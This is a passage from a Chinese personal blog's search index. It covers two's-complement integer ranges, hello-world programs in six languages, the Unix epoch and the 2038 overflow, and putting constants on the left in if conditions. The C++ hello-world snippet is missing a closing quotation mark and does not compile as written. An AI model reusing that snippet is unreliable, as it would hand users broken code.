0000</code>约定俗成给了-128。<br>这也是后来补码的优势，补码不仅区分0存在两个编码的问题，还可以让计算机多表示一个数[-128,127]，如果按照原码或者反码一个字节就只能表示[-127,+127]。</p><blockquote><p>如果你还记得编程语言中各类型的取值范围的话：比如char就是一字节，范围[-2^7 到 2^7-1]<br>int类型占用四字节，范围就是[-2^31 到 2^31-1]</p></blockquote><img src="/2021/01/01/threeYards/000.png" class=""><blockquote><p>可以看看这个图<br>正数不多解释三码一致0就是0000 0000直到127的补码0111 1111<br>按照补码习惯，1111 1111就表示为-1，-1的反码是1111 1110，原码是1000 0001<br>当然这也是因为一字节能够容纳这些数字，128的二进制是1000 0000</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>三码的过程还是很意思的，补码也是后面计算机存储用的编码方式；不好理解的再去找些视频看看，做几个题练练吧。</p><p>另外就是提到计算机本质上减法也是通过加法实现，乘除好像是通过位运算，但是最终结果还是累加得到的。不过记不太清了后面用到了再回来补一补。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/01/01/hello-world/"/>
      <url>/2021/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World!"></a>Hello World!</h1><span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello world! &lt;&lt; std::endl;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>自我反省</title>
      <link href="/1970/01/01/%E8%87%AA%E7%9C%81/"/>
      <url>/1970/01/01/%E8%87%AA%E7%9C%81/</url>
      
        <content type="html"><![CDATA[<h1 id="每一次的学习都是在接受自己的不足"><a href="#每一次的学习都是在接受自己的不足" class="headerlink" title="每一次的学习都是在接受自己的不足"></a>每一次的学习都是在接受自己的不足</h1><span id="more"></span><hr><h1 id="计算机时间起点1970-01-01"><a href="#计算机时间起点1970-01-01" class="headerlink" title="计算机时间起点1970.01.01"></a>计算机时间起点1970.01.01</h1><ol><li>最懒的解释<br> 很多编程语言起源于UNIX系统，而UNIX系统认为1970年1月1日0点是时间纪元，所以我们常说的UNIX时间戳是以1970年1月1日0点为计时起点时间的。</li><li>河狸的<br> 那时候的计算机操作系统是32位的<ul><li>32位能表示的最大值是2147483647。另外1年365天的总秒数是<code>31536000</code>，<code>2147483647/31536000 = 68.1</code></li><li>从1970年开始算，加上68.1年，实际最终可到2038年01月19日03时14分07秒，便会到 达最大时间，过了这个时间点，所有32位操作系统时间便会变为10000000 00000000 00000000 00000000，算下来也就是1901年12月13日20时45分52秒，这样便会出现时间回归的现象，很多软件便会运行异常了。</li></ul></li></ol><p>不过现如今的计算机都是64位了，大概能表示到<code>292,277,026,596年</code>，那以后就不是咱操心的了。</p><hr><h1 id="if骚操作"><a href="#if骚操作" class="headerlink" title="if骚操作"></a>if骚操作</h1><p>在常见的代码中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都是变量在左，常量在右，但是有一种最傻的情况</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a = <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你少写了一个等于号，让比较条件变成了赋值条件，编译器是不会报错的，因为赋值语句是合法的。</p><p>将习惯改变之后，常量在左边，变量在右边</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="number">0</span> = a)&#123;</span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样编译器会很容易就给出错误提示。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
